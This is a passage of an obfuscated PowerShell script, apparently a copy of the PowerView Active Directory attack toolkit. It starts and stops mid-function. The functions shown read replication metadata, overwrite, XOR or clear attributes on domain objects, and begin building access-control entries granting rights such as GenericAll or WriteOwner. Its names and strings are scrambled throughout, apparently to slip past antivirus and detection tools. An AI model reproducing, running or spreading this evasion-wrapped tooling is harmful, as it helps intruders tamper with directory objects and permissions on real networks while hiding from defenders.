                        ${ou`TP`UT}."PS`ObjECt"."t`YPeNA`Mes".("{1}{2}{0}" -f't','In','ser').Invoke(0, ("{6}{8}{5}{7}{0}{2}{3}{4}{1}" -f'i','story','b','u','teHi','c','PowerView.AD','tAttr','Obje'))
                        ${OuTp`Ut}
                    }
                }
                else {
                    &("{1}{2}{0}{3}"-f'e','Write-','V','rbose') ('[Get-D'+'om'+'ainObjectA'+'tt'+'ribute'+'Hi'+'s'+'tory]'+' '+'Erro'+'r'+' '+'retri'+'evi'+'ng'+' '+('Jb'+'fmsd'+'s-rep'+'lattri'+'bute'+'me'+'tada'+'t'+'aJbf ')."rEP`lA`Ce"(([ChAr]74+[ChAr]98+[ChAr]102),[sTrING][ChAr]39)+'fo'+'r '+"'$ObjectDN'")
                }
            }
        }
    }
}


function GeT-DOM`AiNOBJeCT`lINKed`A`Ttri`BUtEhi`sTORy {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{5}{6}{7}{4}{1}{2}{8}{3}{0}" -f 'ents','d','Vars','ThanAssignm','e','PS','UseDec','lar','More'}, '')]
    [OutputType({"{6}{5}{4}{3}{10}{0}{8}{2}{1}{9}{7}"-f 'd','eHi','t','.ADO','iew','werV','Po','y','Attribu','stor','bjectLinke'})]
    [CmdletBinding()]
    Param(
        [Parameter(posiTion = 0, VAlUefROMpIpELine = ${t`RUe}, vaLUefROMpiPELiNEbYPrOpErTynaME = ${tr`UE})]
        [Alias({"{3}{1}{2}{0}" -f'uishedName','n','g','Disti'}, {"{1}{0}{3}{4}{2}"-f 'Acc','Sam','tName','o','un'}, {"{0}{1}"-f'N','ame'}, {"{3}{4}{1}{0}{6}{5}{2}"-f 'sti','i','dName','Membe','rD','he','nguis'}, {"{2}{0}{1}" -f 'mberNam','e','Me'})]
        [String[]]
        ${IDENt`i`TY},

        [ValidateNotNullOrEmpty()]
        [String]
        ${dO`maIn},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}" -f'Fi','lter'})]
        [String]
        ${LdA`P`FILteR},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${PROpE`R`T`ies},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}" -f 'ADSPa','th'})]
        [String]
        ${Se`ARCH`BAse},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{1}{0}{4}{3}"-f'tr','n','DomainCo','ler','ol'})]
        [String]
        ${Se`Rver},

        [ValidateSet({"{0}{1}" -f 'Bas','e'}, {"{2}{0}{1}" -f 'eL','evel','On'}, {"{0}{1}" -f'S','ubtree'})]
        [String]
        ${SeArC`hS`C`ope} = ("{1}{0}"-f 'ree','Subt'),

        [ValidateRange(1, 10000)]
        [Int]
        ${rEsUlTPA`Ge`SI`Ze} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${SERv`er`TIM`E`lim`IT},

        [Switch]
        ${tO`mbS`T`ONE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${c`R`edEntiaL} =  ${7`T`Q02}::"em`pTY",

        [Switch]
        ${R`AW}
    )

    BEGIN {
        ${Sea`RCh`er`ARGuMEN`Ts} = @{
            ("{1}{2}{0}"-f 'es','Pro','perti')    =   ("{6}{5}{4}{0}{3}{2}{1}" -f'ue','a','dat','meta','l','replva','msds-'),("{1}{0}{4}{3}{2}" -f'sti','di','me','hedna','nguis')
            'Raw'           =   ${tR`Ue}
        }
        if (${P`s`B`ouNDpArA`mETE`Rs}[("{1}{0}" -f'omain','D')]) { ${sEa`R`CHERA`RGUMEN`Ts}[("{0}{1}" -f'Do','main')] = ${Do`MA`In} }
        if (${psBOundpa`R`A`M`ETE`Rs}[("{2}{3}{0}{1}"-f'e','r','L','DAPFilt')]) { ${sE`ArC`HERARG`UM`EntS}[("{3}{1}{0}{2}"-f't','APFil','er','LD')] = ${l`D`Ap`FIlteR} }
        if (${psb`oundp`AR`Ame`TeRS}[("{0}{1}{2}" -f'Sea','r','chBase')]) { ${Sear`C`HE`RARgUmeN`TS}[("{3}{0}{1}{2}"-f'e','a','rchBase','S')] = ${S`E`ARchBAse} }
        if (${PS`BoUn`DPAr`AME`TeRS}[("{0}{1}" -f'Serv','er')]) { ${s`eA`R`c`heRar`GuMENtS}[("{0}{1}" -f 'Ser','ver')] = ${Se`RV`er} }
        if (${p`sboundpaRam`et`Ers}[("{2}{1}{0}{3}"-f'hSco','c','Sear','pe')]) { ${SEa`RC`h`erArGUMEntS}[("{3}{0}{1}{2}" -f 'c','o','pe','SearchS')] = ${SEa`R`cHs`coPE} }
        if (${PsbOuN`d`ParAmeT`Ers}[("{3}{2}{1}{0}" -f 'ize','eS','g','ResultPa')]) { ${sEa`Rchera`RguM`e`N`TS}[("{0}{2}{3}{1}" -f 'R','geSize','es','ultPa')] = ${REs`U`LTPA`GesIze} }
        if (${pSbOU`NDpA`R`AmetErs}[("{3}{4}{2}{1}{0}"-f'mit','Li','verTime','Se','r')]) { ${S`ea`RCh`eRARg`UmENTs}[("{4}{1}{3}{2}{0}"-f'imit','rverT','meL','i','Se')] = ${S`er`V`e`RTIm`EliMiT} }
        if (${ps`BouN`DPARA`Me`TERs}[("{2}{3}{1}{0}" -f 'ne','o','Tom','bst')]) { ${SE`Ar`chE`RAr`gUMEnts}[("{2}{0}{1}"-f'st','one','Tomb')] = ${toM`BSTo`NE} }
        if (${ps`B`OuN`dpaRAMeTe`RS}[("{3}{2}{0}{1}" -f 'tia','l','en','Cred')]) { ${S`e`ArC`hErARg`UME`Nts}[("{2}{1}{0}"-f 'ntial','rede','C')] = ${CrED`E`NT`IAL} }

        if (${P`SBOu`Ndp`ArAMETe`RS}[("{1}{2}{0}" -f'es','P','roperti')]) {
            ${pr`OpE`R`TYfil`TeR} = ${pSboUN`D`PARA`M`eTErS}[("{1}{2}{0}" -f 'rties','Prop','e')] -Join '|'
        }
        else {
            ${p`ROpER`TYf`I`LtEr} = ''
        }
    }

    PROCESS {
        if (${P`s`BO`UnDpA`RamE`TeRs}[("{2}{1}{0}"-f'ty','nti','Ide')]) { ${seaRch`E`R`ArgU`MEntS}[("{0}{1}"-f'Iden','tity')] = ${I`DE`NTiTY} }

        &("{1}{2}{0}{4}{3}"-f 'ainObj','G','et-Dom','ct','e') @SearcherArguments | &("{1}{3}{0}{2}"-f 'ch-Objec','F','t','orEa') {
            ${O`BjEct`Dn} = ${_}."pRoPe`RT`IEs"[("{0}{4}{2}{3}{1}" -f 'di','name','n','guished','sti')][0]
            ForEach(${X`MlN`ode} in ${_}."pro`PeRT`IeS"[("{1}{2}{3}{4}{0}"-f 'etadata','msds-','replv','alu','em')]) {
                ${tEm`pOB`jeCT} = [xml]${X`M`lNoDe} | &("{2}{1}{3}{0}"-f't','ect','Sel','-Objec') -ExpandProperty ("{4}{2}{0}{1}{3}"-f'LUE_ME','TA','S_REPL_VA','_DATA','D') -ErrorAction ("{0}{1}{4}{3}{2}"-f 'Sil','e','tinue','n','ntlyCo')
                if (${TEmpO`Bj`E`Ct}) {
                    if (${Te`m`PobJE`CT}."pSZ`ATt`RIb`Ut`E`NamE" -Match ${PRo`Pe`R`T`yfilTER}) {
                        ${O`UTPuT} = &("{1}{2}{0}" -f 't','New','-Objec') ("{1}{0}" -f'bject','PSO')
                        ${O`UTPUT} | &("{1}{0}{2}" -f'be','Add-Mem','r') ("{2}{1}{3}{0}"-f 'ty','tePrope','No','r') ("{1}{0}"-f 'N','ObjectD') ${o`Bjec`TDN}
                        ${O`UTp`UT} | &("{0}{2}{1}"-f'Add-Me','r','mbe') ("{3}{1}{2}{0}"-f'y','eP','ropert','Not') ("{0}{1}{3}{2}" -f'At','trib','Name','ute') ${T`eMPObJ`ect}."P`Sz`ATTr`I`BUTEname"
                        ${O`UTPUt} | &("{2}{0}{1}" -f 'Me','mber','Add-') ("{2}{0}{1}{3}"-f 'oteProp','er','N','ty') ("{2}{3}{1}{0}" -f'alue','uteV','Attr','ib') ${tem`Pobj`eCT}."psZO`B`jECTDN"
                        ${O`UtPUt} | &("{2}{1}{0}" -f 'Member','-','Add') ("{1}{2}{0}{3}"-f 'per','NoteP','ro','ty') ("{0}{1}{3}{2}"-f 'TimeC','r','d','eate') ${T`EMpo`B`JECT}."f`TiME`crEAted"
                        ${oUT`P`Ut} | &("{2}{1}{0}" -f'er','d-Memb','Ad') ("{3}{0}{1}{2}"-f 'otePr','op','erty','N') ("{2}{0}{1}"-f'eDel','eted','Tim') ${t`E`Mp`OBjeCT}."F`TIMe`DelEtED"
                        ${ou`T`puT} | &("{2}{0}{3}{1}"-f '-','er','Add','Memb') ("{3}{1}{2}{0}"-f'y','eP','ropert','Not') ("{3}{0}{5}{2}{6}{1}{4}"-f'astOri','gChan','a','L','ge','gin','tin') ${Tem`p`ObJ`eCt}."ftI`melaSToRIGIN`A`TINGcHa`Nge"
                        ${Ou`T`pUT} | &("{0}{1}{2}" -f 'Add-','Me','mber') ("{1}{0}{2}"-f 'ope','NotePr','rty') ("{2}{1}{0}"-f 'on','i','Vers') ${TEm`po`BjEcT}."dWveR`sI`ON"
                        ${Ou`TPUT} | &("{2}{1}{0}" -f 'mber','d-Me','Ad') ("{1}{2}{0}" -f'ty','NoteP','roper') ("{5}{3}{2}{0}{4}{1}" -f 'ngDs','DN','inati','rig','a','LastO') ${T`e`m`PObJeCT}."p`S`Zl`AS`TORIGI`NatIn`gDS`Adn"
                        ${o`U`TPUt}."pS`O`BJECt"."type`N`A`MEs".("{1}{0}"-f 'ert','Ins').Invoke(0, ("{7}{5}{9}{8}{4}{10}{3}{0}{2}{1}{6}" -f't','sto','ributeHi','kedAt','bjec','r','ry','Powe','ew.ADO','Vi','tLin'))
                        ${OU`TP`UT}
                    }
                }
                else {
                    &("{0}{2}{1}{3}" -f 'Writ','r','e-Ve','bose') ('['+'Get-Dom'+'ain'+'Obje'+'ctLin'+'kedAttributeHi'+'story]'+' '+'Err'+'or'+' '+'retr'+'ievin'+'g '+(('wl0msds-r'+'e'+'pl'+'valueme'+'ta'+'datawl'+'0 ')-cREPlACe ([cHAR]119+[cHAR]108+[cHAR]48),[cHAR]39)+'for'+' '+"'$ObjectDN'")
                }
            }
        }
    }
}


function S`et-DOMAIN`oBJECT {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{11}{6}{5}{0}{1}{3}{9}{4}{8}{2}{10}{7}" -f'roc','ess','unc','ForState','ang','houldP','SUseS','ns','ingF','Ch','tio','P'}, '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{3}{1}{2}{0}"-f 's','P','roces','PSShould'}, '')]
    [CmdletBinding()]
    Param(
        [Parameter(pOsItIoN = 0, ManDaTOrY = ${Tr`Ue}, VaLUEfrOMPiPeLINe = ${T`Rue}, vALuEfrOMPipELinEbYprOpErtYnaME = ${t`Rue})]
        [Alias({"{4}{0}{1}{3}{5}{2}" -f 'is','tingui','dName','sh','D','e'}, {"{4}{0}{3}{1}{2}"-f'coun','Nam','e','t','SamAc'}, {"{1}{0}" -f 'me','Na'})]
        [String[]]
        ${ID`e`NTItY},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}{2}" -f 'epl','R','ace'})]
        [Hashtable]
        ${s`eT},

        [ValidateNotNullOrEmpty()]
        [Hashtable]
        ${X`oR},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${CL`EAR},

        [ValidateNotNullOrEmpty()]
        [String]
        ${D`OMa`iN},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}" -f'Filt','er'})]
        [String]
        ${Ld`Ap`FiLTEr},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{0}{1}" -f 'Pat','h','ADS'})]
        [String]
        ${se`A`RCh`BaSE},

        [ValidateNotNullOrEmpty()]
        [Alias({"{4}{0}{2}{1}{3}"-f'ai','ol','nContr','ler','Dom'})]
        [String]
        ${SeR`V`eR},

        [ValidateSet({"{0}{1}" -f'Ba','se'}, {"{0}{1}"-f'OneL','evel'}, {"{0}{2}{1}"-f 'Su','ree','bt'})]
        [String]
        ${sE`ARCh`S`cOPE} = ("{0}{1}" -f 'Subtre','e'),

        [ValidateRange(1, 10000)]
        [Int]
        ${R`EsU`ltP`AG`esIZe} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${S`eRv`erTiME`lIMIt},

        [Switch]
        ${TOMB`stO`NE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cred`eNt`iAl} =  ${7`TQ02}::"em`Pty"
    )

    BEGIN {
        ${se`ARc`hERAr`g`UmENtS} = @{'Raw' = ${Tr`Ue}}
        if (${p`SbOU`N`D`paRAM`ETers}[("{0}{1}"-f 'Doma','in')]) { ${sE`AR`ChE`RaR`GUmeNTs}[("{1}{0}"-f'omain','D')] = ${d`OMAin} }
        if (${pS`BouNDpAraME`T`E`RS}[("{2}{1}{0}"-f 'Filter','AP','LD')]) { ${S`EarChERARGU`m`e`NTs}[("{1}{2}{3}{0}"-f 'lter','LD','A','PFi')] = ${LD`APfIl`Ter} }
        if (${psbo`UNDPaRAM`ET`eRS}[("{0}{1}{2}"-f 'Sear','chBas','e')]) { ${sEArch`e`RAR`GuMe`NTs}[("{2}{1}{0}" -f'chBase','ear','S')] = ${s`E`ArchbA`Se} }
        if (${P`SbO`U`NDpAR`AMETe`Rs}[("{0}{1}"-f'Serve','r')]) { ${seARC`hEraRG`U`Ments}[("{0}{1}"-f'Se','rver')] = ${sE`RVER} }
        if (${PSbo`U`NDPAR`AmEt`eRS}[("{1}{0}{3}{2}"-f'c','Sear','cope','hS')]) { ${s`eArchERaRgUm`E`Nts}[("{2}{0}{1}{3}"-f'hSc','o','Searc','pe')] = ${sE`ARcH`sC`opE} }
        if (${P`SbOUNdp`ARa`METErs}[("{0}{2}{3}{1}" -f 'Resul','Size','tP','age')]) { ${SEA`R`CHera`Rgu`me`NTs}[("{0}{1}{2}"-f'ResultPa','geSi','ze')] = ${ReSu`l`Tp`AGesiZE} }
        if (${ps`BoU`NDPara`Me`TErS}[("{3}{1}{4}{0}{2}" -f'L','rverTi','imit','Se','me')]) { ${SeA`RCHERaR`GUme`N`Ts}[("{0}{2}{1}"-f 'Serve','TimeLimit','r')] = ${S`ErV`e`RtIMeLImit} }
        if (${PS`BOundPa`RA`M`EtERs}[("{0}{2}{1}" -f'To','bstone','m')]) { ${SEaR`ch`E`RarGUm`enTS}[("{2}{1}{0}"-f 'one','t','Tombs')] = ${toMb`sTO`Ne} }
        if (${ps`BOUNDPar`AMetE`RS}[("{0}{1}{2}" -f 'Crede','ntia','l')]) { ${SeA`RC`HER`A`RG`UMeNtS}[("{1}{0}{2}"-f'ed','Cr','ential')] = ${C`Re`D`EntIaL} }
    }

    PROCESS {
        if (${pSBo`UND`PAr`AMEt`erS}[("{0}{1}{2}" -f 'Ide','nti','ty')]) { ${Sea`RcHeRA`RG`UmenTs}[("{0}{1}" -f'Id','entity')] = ${I`D`en`TitY} }

        
        ${RA`W`oBj`ECt} = &("{1}{4}{3}{2}{0}"-f'ct','Get','nObje','ai','-Dom') @SearcherArguments

        ForEach (${OB`J`eCT} in ${r`AwO`BJe`Ct}) {

            ${E`Nt`Ry} = ${r`AwObj`ECt}.("{4}{2}{3}{0}{5}{1}"-f'ryE','ry','Direct','o','Get','nt').Invoke()

            if(${PS`Boun`DparAmeTe`Rs}['Set']) {
                try {
                    ${p`Sb`Ou`NDPA`RAmeT`ERS}['Set'].("{0}{1}{3}{2}"-f 'GetE','numera','or','t').Invoke() | &("{1}{0}{3}{2}" -f 'orE','F','ct','ach-Obje') {
                        &("{1}{0}{3}{2}" -f 'e-','Writ','erbose','V') "[Set-DomainObject] Setting '$($_.Name)' to '$($_.Value)' for object '$($RawObject.Properties.samaccountname)' "
                        ${En`TRY}.("{0}{1}" -f 'pu','t').Invoke(${_}."na`ME", ${_}."vaL`UE")
                    }
                    ${e`NtRY}.("{1}{3}{0}{2}"-f 'ange','co','s','mmitch').Invoke()
                }
                catch {
                    &("{3}{1}{4}{2}{0}"-f'ng','rite','rni','W','-Wa') "[Set-DomainObject] Error setting/replacing properties for object '$($RawObject.Properties.samaccountname)' : $_ "
                }
            }
            if(${pS`BounDPa`R`A`mEtE`RS}['XOR']) {
                try {
                    ${P`sb`O`UNdpArAMetErs}['XOR'].("{0}{2}{1}"-f'Get','or','Enumerat').Invoke() | &("{0}{2}{3}{1}"-f 'ForE','-Object','a','ch') {
                        ${pRO`per`TynaMe} = ${_}."Na`mE"
                        ${pR`oPe`R`TyX`OrvAL`Ue} = ${_}."vaL`UE"
                        &("{2}{0}{1}"-f'te-Verb','ose','Wri') "[Set-DomainObject] XORing '$PropertyName' with '$PropertyXorValue' for object '$($RawObject.Properties.samaccountname)' "
                        ${tY`P`enA`me} = ${E`N`TRy}.${pR`oPE`RTYNAme}[0].("{1}{2}{0}"-f 'pe','Ge','tTy').Invoke()."N`AMe"

                        
                        ${pRO`p`erTYVA`lUE} = $(${E`NTrY}.${p`Ro`PERt`YNAme}) -bxor ${pR`OpeR`TYX`ORvA`l`UE}
                        ${En`TrY}.${PROP`er`Tyna`mE} = ${pROPeRt`Yval`UE} -as ${typ`eNAme}
                    }
                    ${E`NTRy}.("{1}{0}{3}{4}{2}"-f'mm','co','nges','i','tcha').Invoke()
                }
                catch {
                    &("{0}{2}{1}" -f'W','rning','rite-Wa') "[Set-DomainObject] Error XOR'ing properties for object '$($RawObject.Properties.samaccountname)' : $_ "
                }
            }
            if(${PsbOun`d`pAra`Me`Ters}[("{1}{0}"-f 'r','Clea')]) {
                try {
                    ${psBOUNDpaRa`m`ETE`Rs}[("{0}{1}"-f 'Cle','ar')] | &("{3}{2}{1}{0}"-f 'ct','je','rEach-Ob','Fo') {
                        ${pR`opErTyN`AmE} = ${_}
                        &("{3}{0}{1}{2}{4}" -f'r','ite-','Ve','W','rbose') "[Set-DomainObject] Clearing '$PropertyName' for object '$($RawObject.Properties.samaccountname)' "
                        ${e`N`TRY}.${p`R`operTynA`Me}.("{1}{0}" -f'r','clea').Invoke()
                    }
                    ${ent`Ry}.("{2}{3}{1}{0}" -f'anges','h','c','ommitc').Invoke()
                }
                catch {
                    &("{1}{2}{0}" -f'Warning','W','rite-') "[Set-DomainObject] Error clearing properties for object '$($RawObject.Properties.samaccountname)' : $_ "
                }
            }
        }
    }
}


function c`on`VErtfrom-L`Da`pl`OGoNHo`UrS {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{0}{10}{5}{2}{6}{9}{4}{8}{3}{7}" -f's','PSU','aredV','nAssignm','h','cl','a','ents','a','rsMoreT','eDe'}, '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{2}{1}{3}" -f 'PSShouldPro','e','c','ss'}, '')]
    [OutputType({"{0}{3}{1}{4}{2}"-f'PowerView','ogonHou','s','.L','r'})]
    [CmdletBinding()]
    Param (
        [Parameter( vaLUEFroMPIpELiNe = ${TR`Ue}, VAlUEfRoMpIpElINebypropERTynAme = ${tr`Ue})]
        [ValidateNotNullOrEmpty()]
        [byte[]]
        ${logOn`H`Ou`RSa`RRAY}
    )

    Begin {
        if(${LogoN`hoU`RsaR`RaY}."C`ouNT" -ne 21) {
            throw ("{6}{4}{7}{1}{2}{5}{0}{3}"-f'ect leng','i','n','th','HoursArray i','corr','Logon','s the ')
        }

        function ConvERt`T`O-LoGONHO`URSaRr`Ay {
            Param (
                [int[]]
                ${hOu`RSa`Rr}
            )

            ${logO`NH`OUrs} = &("{2}{1}{0}"-f't','-Objec','New') ("{0}{1}" -f'bool[',']') 24
            for(${I}=0; ${I} -lt 3; ${i}++) {
                ${B`yte} = ${Hour`s`ArR}[${I}]
                ${O`FFS`et} = ${I} * 8
                ${S`Tr} =   (gET-vaRiAbLe ("{0}{1}" -f'5Yxv6','c') -vALuEo  )::("{1}{2}{0}" -f 'g','ToS','trin').Invoke(${b`yTE},2).("{1}{2}{0}"-f 't','Pa','dLef').Invoke(8,'0')

                ${Lo`gO`Nh`OuRS}[${Off`seT}+0] = [bool]  (  iTEM  ("{0}{4}{2}{3}{1}"-f'v','V6c','ab','Le:5yx','ari'))."VA`LUE"::"T`oIn`T32"([string]${s`TR}[7])
                ${lOg`oNhO`URs}[${O`FfS`ET}+1] = [bool]  ${5`yx`V6c}::"toIn`T32"([string]${S`TR}[6])
                ${lO`GonH`O`Urs}[${OF`F`sET}+2] = [bool]   (vARiabLE  ("{1}{0}" -f'yXV6C','5')  -VAlU )::"toi`Nt32"([string]${S`Tr}[5])
                ${LoG`oNhO`Urs}[${oFFs`Et}+3] = [bool]   ${5yXv`6C}::"t`OinT32"([string]${s`TR}[4])
                ${Lo`g`o`NhouRS}[${OfF`Set}+4] = [bool]   ( GCI  ("{3}{1}{2}{4}{0}"-f 'xV6c','ARIA','b','v','lE:5Y')  )."V`AluE"::"T`O`InT32"([string]${s`Tr}[3])
                ${l`Og`ONhoUrs}[${o`F`FSET}+5] = [bool]   (  gET-VArIABLe  ("{0}{1}"-f '5Yx','v6c'))."va`LUE"::"TOIN`T32"([string]${s`TR}[2])
                ${Lo`GOn`hOURs}[${o`F`FsET}+6] = [bool]   (VaRIABLE ('5yXv6'+'c') )."VA`Lue"::"T`OiNt32"([string]${s`Tr}[1])
                ${loGON`hou`Rs}[${Of`Fs`Et}+7] = [bool]   (VarIabLE ("5YXv"+"6c")  -vaL)::"TO`i`Nt32"([string]${s`TR}[0])
            }

            ${lO`G`on`hOURS}
        }
    }

    Process {
        ${o`UT`pUt} = @{
            ("{1}{0}" -f 'nday','Su') = &("{3}{2}{1}{4}{0}" -f'ay','o-LogonH','vertT','Con','oursArr') -HoursArr ${lOGonhoU`RSar`RAy}[0..2]
            ("{0}{1}" -f'Mo','nday') = &("{1}{4}{5}{0}{2}{6}{3}" -f'g','ConvertTo-','o','rsArray','L','o','nHou') -HoursArr ${loGONHo`UR`sA`RR`Ay}[3..5]
            ("{1}{0}"-f'esday','Tu') = &("{4}{5}{0}{1}{6}{2}{3}" -f'Lo','g','nHoursArr','ay','Conve','rtTo-','o') -HoursArr ${lOg`O`Nho`URsarrAY}[6..8]
            ("{0}{2}{1}"-f'W','day','ednes') = &("{0}{4}{3}{5}{1}{2}"-f 'C','oursAr','ray','To-Lo','onvert','gonH') -HoursArr ${lOGONHo`UrSa`R`Ray}[9..11]
            ("{0}{1}" -f 'T','hurs') = &("{3}{0}{1}{2}{4}" -f 'rtTo','-LogonH','ours','Conve','Array') -HoursArr ${LOgON`HOU`RSArr`AY}[12..14]
            ("{0}{1}"-f'Frid','ay') = &("{1}{6}{0}{5}{2}{3}{4}"-f'rtTo-L','Co','nHo','ursAr','ray','ogo','nve') -HoursArr ${LogONHO`Urs`A`RR`Ay}[15..17]
            ("{1}{0}{2}" -f'tur','Sa','day') = &("{6}{2}{5}{0}{3}{1}{4}" -f 'Ho','rra','onvertT','ursA','y','o-Logon','C') -HoursArr ${lo`gONH`OurSA`RRAy}[18..20]
        }

        ${oU`TpUt} = &("{1}{3}{2}{0}"-f'ect','New-','bj','O') ("{1}{0}"-f'ct','PSObje') -Property ${O`UT`PuT}
        ${oUtP`UT}."psOB`jECT"."T`ypenAM`ES".("{1}{0}" -f 't','Inser').Invoke(0, ("{5}{3}{1}{2}{0}{4}" -f 'ogo','erView.','L','ow','nHours','P'))
        ${OU`TP`Ut}
    }
}


function Ne`W-AdOBje`ctA`Cc`ES`ScOn`Trol`eNt`Ry {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{9}{11}{3}{4}{7}{10}{12}{8}{5}{2}{6}{0}{1}"-f 't','ions','hangingFu','Sh','o','C','nc','uld','sForState','PS','Pro','Use','ces'}, '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{1}{2}" -f 'PSShouldP','roce','ss'}, '')]
    [OutputType({"{3}{5}{9}{8}{1}{11}{4}{10}{0}{7}{12}{6}{2}{13}" -f 's','rity','zationR','Sy','cc','st','thori','sCon','ecu','em.S','e','.A','trol.Au','ule'})]
    [CmdletBinding()]
    Param (
        [Parameter(POSITiOn = 0, vALuEfRoMPIpELiNe = ${T`Rue}, vAlUEFrompipElIneByPROPERTynaMe = ${t`Rue}, mAnDATORy = ${T`RUE})]
        [Alias({"{4}{2}{0}{1}{5}{3}" -f'i','ngui','st','dName','Di','she'}, {"{3}{2}{1}{0}{4}"-f'Na','nt','cou','SamAc','me'}, {"{1}{0}" -f 'me','Na'})]
        [String]
        ${p`RiNCiP`ALid`eNt`iTy},

        [ValidateNotNullOrEmpty()]
        [String]
        ${P`RiNcipALDo`m`A`IN},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{0}{3}{1}" -f 'Control','er','Domain','l'})]
        [String]
        ${S`eRVer},

        [ValidateSet({"{0}{1}" -f 'Bas','e'}, {"{0}{2}{1}" -f 'One','l','Leve'}, {"{0}{1}{2}" -f 'Sub','t','ree'})]
        [String]
        ${SeArch`sc`o`pE} = ("{1}{0}{2}" -f'b','Su','tree'),

        [ValidateRange(1, 10000)]
        [Int]
        ${rESUlT`paGE`Size} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${sEr`VERtI`M`e`limit},

        [Switch]
        ${tom`Bs`ToNe},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${C`R`eDENtIaL} =   ${7`TQ02}::"em`PtY",

        [Parameter(manDAtORY = ${t`RUe})]
        [ValidateSet({"{5}{0}{4}{3}{2}{1}"-f 'Sys','ty','Securi','em','t','Access'}, {"{0}{1}{2}"-f 'Cr','eateCh','ild'},{"{1}{0}{2}" -f't','Dele','e'},{"{2}{1}{0}"-f'hild','teC','Dele'},{"{2}{1}{0}"-f 'Tree','e','Delet'},{"{1}{0}{3}{2}"-f'ten','Ex','ght','dedRi'},{"{1}{2}{3}{0}" -f 'ricAll','Ge','n','e'},{"{3}{2}{0}{1}" -f'icExecu','te','er','Gen'},{"{2}{1}{0}" -f 'd','nericRea','Ge'},{"{1}{0}{2}"-f 'ric','Gene','Write'},{"{1}{0}{2}" -f 'tChi','Lis','ldren'},{"{2}{0}{1}" -f't','Object','Lis'},{"{2}{3}{0}{1}" -f 'ntro','l','R','eadCo'},{"{3}{2}{0}{1}" -f 't','y','er','ReadProp'},{"{1}{0}"-f'elf','S'},{"{0}{1}{2}{3}"-f 'Sy','nc','hr','onize'},{"{2}{1}{0}" -f 'cl','teDa','Wri'},{"{3}{2}{0}{1}"-f 'n','er','riteOw','W'},{"{3}{2}{1}{0}" -f 'rty','e','rop','WriteP'})]
        ${r`I`ght},

        [Parameter(MandAtOry = ${T`RUE}, pARAMeTeRSETname="acCessrulE`T`yPE")]
        [ValidateSet({"{1}{0}" -f'low','Al'}, {"{1}{0}"-f 'ny','De'})]
        [String[]]
        ${aCCEssco`NtR`Olt`yPE},

        [Parameter(mandatorY = ${t`Rue}, ParaMETErSeTNaMe="aU`d`ItRule`Type")]
        [ValidateSet({"{1}{0}"-f'ss','Succe'}, {"{1}{0}"-f 'ilure','Fa'})]
        [String]
        ${Aud`ITFl`Ag},

        [Parameter(MANdatOrY = ${f`AL`sE}, parAmeTErSEtname="A`Cce`ssRulet`yPe")]
        [Parameter(maNdatoRy = ${Fa`lsE}, pArAMeTErSEtNaMe="a`UD`iTruLE`TYPE")]
        [Parameter(manDaTOrY = ${f`AlsE}, PArAMeTeRseTName="ob`je`c`T`guIdLoO`KuP")]
        [Guid]
        ${O`BJ`eCtTyPe},

        [ValidateSet('All', {"{0}{1}{2}"-f 'Child','re','n'},{"{2}{0}{1}{3}" -f'ende','nt','Desc','s'},{"{0}{1}"-f 'No','ne'},{"{1}{0}{2}"-f'dChi','SelfAn','ldren'})]
        [String]
        ${iN`herI`T`AnCety`Pe},

        [Guid]
        ${I`NHErITe`DOBJe`Ct`TyPe}
    )

    Begin {
        if (${PrI`N`CipALIDE`NTItY} -notmatch ("{0}{1}" -f '^S-','1-.*')) {
            ${prI`NCI`PaLS`Ea`Rc`hEr`AR`GuMEN`Ts} = @{
                ("{2}{1}{0}"-f 'ntity','e','Id') = ${pRi`NcIPalI`D`ENT`ITY}
                ("{1}{2}{0}{3}" -f 'perti','P','ro','es') = ("{1}{5}{2}{3}{0}{4}{6}" -f 'b','dis','inguished','name,o','jectsi','t','d')
            }
            if (${PsbO`Un`DpARAmeTe`RS}[("{1}{3}{4}{0}{2}"-f 'lDom','Pr','ain','inc','ipa')]) { ${prin`CiPaLSeAR`cHEr`ArGUMEn`Ts}[("{0}{1}" -f'Doma','in')] = ${Pr`INci`paLd`om`AIn} }
            if (${pSbOUndP`ARa`MET`eRS}[("{0}{1}" -f 'Ser','ver')]) { ${PriNcipAlSea`RcH`eraR`GU`M`ENTs}[("{0}{1}"-f'Se','rver')] = ${s`e`Rver} }
            if (${p`SbO`UNDpA`R`AMeTe`Rs}[("{0}{2}{1}"-f 'Se','rchScope','a')]) { ${PRIncI`p`AlSeArChe`R`Argu`mEN`TS}[("{3}{0}{2}{1}"-f'arch','cope','S','Se')] = ${Se`ARc`hSCoPE} }
            if (${psbO`UnDPaR`A`mE`TErS}[("{2}{0}{4}{1}{3}" -f 's','ltPa','Re','geSize','u')]) { ${pRiNc`ipALseaRCHeR`A`RgUm`En`TS}[("{3}{2}{1}{0}"-f'eSize','tPag','sul','Re')] = ${r`e`SuLtPA`geSize} }
            if (${P`S`BOU`NDpARAMeTers}[("{3}{2}{0}{4}{1}"-f'eL','it','im','ServerT','im')]) { ${PriNCIPALSEa`RC`hE`RaR`G`UME`NTs}[("{4}{0}{2}{1}{3}" -f 'er','im','TimeL','it','Serv')] = ${SERV`ERTi`M`eL`ImiT} }
